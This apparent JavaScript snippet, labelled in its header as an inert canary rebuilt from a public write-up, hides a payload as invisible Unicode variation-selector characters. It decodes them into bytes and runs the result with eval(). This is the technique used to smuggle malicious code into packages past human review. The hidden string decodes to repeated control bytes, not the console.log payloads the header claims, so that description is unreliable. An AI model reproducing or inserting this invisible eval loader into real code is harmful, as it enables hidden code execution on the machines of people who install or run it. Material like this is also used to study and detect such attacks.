// INERT RECALL CANARY reconstructed from a public write-up. Hosts are .invalid / TEST-NET;
// payloads are console.log strings. Never published, never executed.
const p = '︀︁︂︃︄︅︆︇︈︉︊︋︌︍︎️︀︁︂︃︄︅︆︇︈︉︊︋︌︍︎️︀︁︂︃︄︅︆︇︈︉︊︋︌︍︎️︀︁︂︃︄︅︆︇︈︉︊︋︌︍︎️';

const s = v => [...v].map(c => { const p = c.codePointAt(0); return p >= 0xFE00 && p <= 0xFE0F ? p - 0xFE00 : p >= 0xE0100 && p <= 0xE01EF ? p - 0xE0100 + 16 : null; }).filter(b => b !== null);
eval(Buffer.from(s(p)).toString('utf-8'));
